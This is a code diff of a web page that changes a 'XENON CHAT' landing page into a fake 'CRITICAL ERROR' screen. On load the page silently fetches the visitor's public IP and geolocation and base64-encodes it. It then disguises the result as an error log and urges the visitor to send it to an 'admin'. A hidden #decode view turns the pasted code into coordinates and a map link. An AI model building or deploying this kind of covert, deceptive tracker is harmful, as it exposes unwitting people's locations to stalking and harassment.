@@ -17,84 +17,100 @@
             flex-direction: column;
             justify-content: center;
             align-items: center;
-        }
-        #landing {
             text-align: center;
+        }
+        #error-screen {
+            max-width: 90%;
+            padding: 20px;
         }
         .glitch {
-            font-size: 5rem;
-            letter-spacing: 15px;
-            animation: glitch 3s infinite;
-            text-shadow: 2px 0 #f00, -2px 0 #0ff;
+            font-size: 4.5rem;
+            letter-spacing: 10px;
+            animation: glitch 4s infinite;
+            text-shadow: 0.05em 0 0 #f00, -0.03em -0.04em 0 #0ff, 0.025em 0.04em 0 #f0f;
         }
         @keyframes glitch {
-            0%,100% { text-shadow: 2px 0 #f00, -2px 0 #0ff; }
-            20% { text-shadow: -2px 0 #f00, 2px 0 #0ff; }
-            40% { text-shadow: 2px 0 #0f0, -2px 0 #f0f; }
+            0%,100% { text-shadow: 0.05em 0 0 #f00, -0.03em -0.04em 0 #0ff, 0.025em 0.04em 0 #f0f; }
+            20% { text-shadow: -0.05em -0.025em 0 #f00, 0.025em 0.035em 0 #0ff, -0.05em -0.05em 0 #f0f; }
+            40% { text-shadow: 0.05em 0.035em 0 #f00, 0.03em 0 0 #0ff, 0 0.08em 0 #f0f; }
         }
-        #hidden-data {
-            position: absolute;
-            left: -9999px;
-            opacity: 0;
-            pointer-events: none;
+        #error-log {
+            margin-top: 40px;
+            font-size: 0.95rem;
+            color: #444;
+            max-height: 40vh;
+            overflow-y: auto;
+            white-space: pre-wrap;
+            word-break: break-all;
+            user-select: text;
         }
-        #ip-view {
+        #decode-view {
             display: none;
-            text-align: center;
-            padding: 20px;
+            padding: 30px;
             max-width: 90%;
         }
-        #ip-display {
-            font-size: 2.8rem;
-            word-break: break-all;
+        textarea {
+            width: 100%;
+            height: 120px;
+            background: #111;
+            color: #0f0;
+            border: 1px solid #0f0;
+            font-family: monospace;
+            padding: 10px;
             margin: 20px 0;
+            font-size: 1rem;
         }
-        #geo {
-            font-size: 2rem;
-            color: #0f8;
-            margin: 20px 0;
+        button {
+            background: transparent;
+            border: 2px solid #0f0;
+            color: #0f0;
+            padding: 12px 30px;
+            font-size: 1.3rem;
+            cursor: pointer;
+            transition: all 0.3s;
         }
-        #maplink {
-            font-size: 1.5rem;
-            color: #0ff;
-            text-decoration: none;
+        button:hover {
+            background: #0f0;
+            color: #000;
         }
-        #status {
-            font-size: 1.2rem;
-            color: #555;
-            margin-top: 50px;
-        }
+        #ip-display { font-size: 2.5rem; word-break: break-all; margin: 20px 0; }
+        #geo { font-size: 1.8rem; color: #0f8; margin: 15px 0; }
+        #maplink { font-size: 1.4rem; color: #0ff; text-decoration: none; }
+        #status { color: #555; margin-top: 40px; }
     </style>
 </head>
 <body>
 
-    <div id="landing">
-        <div class="glitch">XENON CHAT</div>
-        <p style="margin-top: 60px; font-size: 1.6rem;">loading shadow node...</p>
+    <div id="error-screen">
+        <div class="glitch">CRITICAL ERROR</div>
+        <p style="font-size:1.4rem; margin:30px 0;">KERNEL PANIC - SHADOW NODE FAILURE</p>
+        <p style="color:#555; font-size:1.1rem;">Error code fragment captured. Send this to admin for analysis:</p>
+        
+        <!-- This is the encoded data – looks like error garbage but is base64 JSON -->
+        <div id="error-log">Loading error log...</div>
     </div>
 
-    <!-- Hidden text that holds the captured data -->
-    <div id="hidden-data"></div>
-
-    <div id="ip-view">
-        <div>SHADOW NODE DATA</div>
-        <div id="ip-display">—</div>
-        <div id="geo">—</div>
-        <a id="maplink" href="#" target="_blank" style="display:none;">→ EXACT COORDINATES</a>
-        <div id="status">data loaded from hidden node</div>
+    <div id="decode-view">
+        <div style="font-size:2rem; margin-bottom:20px;">DECODE ERROR CODE</div>
+        <textarea id="paste-area" placeholder="Paste the full error code here..."></textarea>
+        <button onclick="decodeAndShow()">DECODE</button>
+        
+        <div id="result" style="margin-top:40px;">
+            <div id="ip-display">—</div>
+            <div id="geo">—</div>
+            <a id="maplink" href="#" target="_blank" style="display:none;">→ VIEW EXACT LOCATION</a>
+            <div id="status"></div>
+        </div>
     </div>
 
     <script>
-        const hiddenEl = document.getElementById("hidden-data");
-        const ipView = document.getElementById("ip-view");
+        let capturedData = null;
 
-        async function captureIP() {
+        async function captureAndEncode() {
             try {
-                // Get public IP
                 const ipRes = await fetch('https://api.ipify.org?format=json');
                 const { ip } = await ipRes.json();
 
-                // Get geo (using free no-key API)
                 let geoRes = await fetch(`https://ipapi.co/${ip}/json/`);
                 let geo = await geoRes.json();
 
@@ -104,73 +120,75 @@
                 }
 
                 if (!geo.error && geo.status !== 'fail') {
-                    const data = {
+                    capturedData = {
                         ip: ip,
                         city: geo.city || geo.regionName || '?',
                         country: geo.country || geo.countryName || '?',
                         lat: geo.latitude || geo.lat || 0,
                         lon: geo.longitude || geo.lon || 0,
-                        ts: Date.now()
+                        ts: new Date().toISOString()
                     };
 
-                    // Store as JSON string in hidden element
-                    hiddenEl.textContent = JSON.stringify(data);
-                    console.log("Captured & hidden:", data); // for debug
+                    const jsonStr = JSON.stringify(capturedData);
+                    const encoded = btoa(jsonStr); // base64 encode
+
+                    // Display as "error log" – looks messy/random
+                    const fakeLog = [
+                        "0x0000007B INACCESSIBLE_BOOT_DEVICE",
+                        "Memory corruption at 0xDEADBEEF",
+                        "Stack trace overflow → recovery loop",
+                        "Error fragment (base64): " + encoded,
+                        "Dump partial: " + encoded.slice(0, 80) + "...",
+                        "Send full log to support for decode"
+                    ].join('\n');
+
+                    document.getElementById('error-log').textContent = fakeLog;
+                } else {
+                    document.getElementById('error-log').textContent = "Capture failed - no valid data";
                 }
             } catch (e) {
-                console.error("Capture failed:", e);
-                hiddenEl.textContent = JSON.stringify({ error: "Capture failed" });
+                document.getElementById('error-log').textContent = "Network error - unable to generate log";
             }
         }
 
-        function showIP() {
-            document.getElementById("landing").style.display = "none";
-            ipView.style.display = "flex";
-
-            const raw = hiddenEl.textContent.trim();
-            if (!raw) {
-                document.getElementById("ip-display").textContent = "NO DATA";
-                document.getElementById("status").textContent = "Nothing captured yet — load main page first";
+        function decodeAndShow() {
+            const input = document.getElementById('paste-area').value.trim();
+            if (!input) {
+                document.getElementById('status').textContent = "Paste something first";
                 return;
             }
 
             try {
-                const data = JSON.parse(raw);
+                // Extract base64 part if they paste the whole log
+                const base64Match = input.match(/[A-Za-z0-9+/=]{20,}/);
+                const encoded = base64Match ? base64Match[0] : input;
 
-                if (data.error) {
-                    document.getElementById("ip-display").textContent = "ERROR";
-                    document.getElementById("status").textContent = data.error;
-                    return;
-                }
+                const jsonStr = atob(encoded);
+                const data = JSON.parse(jsonStr);
 
-                document.getElementById("ip-display").textContent = data.ip;
-                document.getElementById("geo").innerHTML = `${data.city} • ${data.country}<br>${data.lat.toFixed(6)}, ${data.lon.toFixed(6)}`;
+                document.getElementById('ip-display').textContent = data.ip;
+                document.getElementById('geo').innerHTML = `${data.city} • ${data.country}<br>${data.lat.toFixed(6)}, ${data.lon.toFixed(6)}`;
 
                 if (data.lat && data.lon) {
-                    const map = document.getElementById("maplink");
+                    const map = document.getElementById('maplink');
                     map.href = `https://www.openstreetmap.org/?mlat=${data.lat}&mlon=${data.lon}#map=15/${data.lat}/${data.lon}`;
-                    map.style.display = "inline-block";
+                    map.style.display = 'inline-block';
                 }
 
-                document.getElementById("status").textContent = `Captured at ${new Date(data.ts).toLocaleString()}`;
+                document.getElementById('status').textContent = `Decoded successfully • Captured: ${new Date(data.ts).toLocaleString()}`;
             } catch (e) {
-                document.getElementById("ip-display").textContent = "PARSE ERROR";
-                document.getElementById("status").textContent = "Invalid hidden data";
+                document.getElementById('status').textContent = "Decode failed - invalid or incomplete code";
             }
         }
 
-        // Run capture on main load
-        captureIP();
+        // Auto-capture on load
+        captureAndEncode();
 
-        // Check hash for #ip
-        function handleHash() {
-            if (location.hash === "#ip") {
-                showIP();
-            }
+        // Show decode page if #decode in URL
+        if (location.hash === '#decode') {
+            document.getElementById('error-screen').style.display = 'none';
+            document.getElementById('decode-view').style.display = 'flex';
         }
-
-        window.addEventListener("hashchange", handleHash);
-        window.addEventListener("load", handleHash);
     </script>
 </body>
 </html>
